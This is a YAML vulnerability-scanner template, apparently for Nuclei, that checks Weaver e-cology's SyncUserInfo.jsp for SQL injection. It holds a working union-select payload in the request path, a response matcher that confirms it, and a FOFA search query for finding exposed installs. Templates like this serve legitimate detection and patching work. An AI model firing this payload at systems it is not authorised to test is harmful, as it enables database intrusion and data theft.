http:
- host-redirects: true
  matchers:
  - part: body
    type: word
    words:
    - '4386499557'
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null'
id: ecology-syncuserinfo-sqli
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  description: Ecology Syncuserinfo contains a SQL injection vulnerability via a GET
    request. An attacker can possibly obtain sensitive information from a database,
    modify data, and execute unauthorized administrative operations in the context
    of the affected site.
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
    max-request: 1
    product: e-cology
    vendor: weaver
  name: Ecology Syncuserinfo - SQL Injection
  reference:
  - https://www.weaver.com.cn/
  - https://github.com/chaitin/xray/blob/master/pocs/ecology-syncuserinfo-sqli.yml
  severity: critical
  tags: ecology,sqli,vuln
